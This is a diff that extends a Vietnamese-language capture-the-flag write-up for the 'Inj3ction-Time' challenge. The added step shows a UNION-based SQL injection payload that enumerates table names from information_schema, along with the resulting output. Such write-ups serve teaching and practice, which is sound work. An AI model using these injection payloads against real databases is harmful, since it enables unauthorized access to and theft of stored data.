@@ -24,3 +24,16 @@ Có thể tham khảo cheatsheet ở https://gist.github.com/nani1337/02c65b06d0
 ```
 Ở đây ta có thể thấy database tên là **webeight**
 ![](https://raw.githubusercontent.com/K3v1ne/ctf-wu/main/Inj3ction-Time/Capture.PNG)
+
+Có database name rồi bây giờ ta sẽ trích xuất tables trong database
+
+**-1 union all select null,null,GROUP_CONCAT(table_name SEPARATOR 0x3c62723e),null from information_schema.tables WHERE TABLE_SCHEMA=DATABASE()**
+
+Kết quả:
+
+```
+Name:
+Breed:
+Color: w0w_y0u_f0und_m3
+webeight
+```
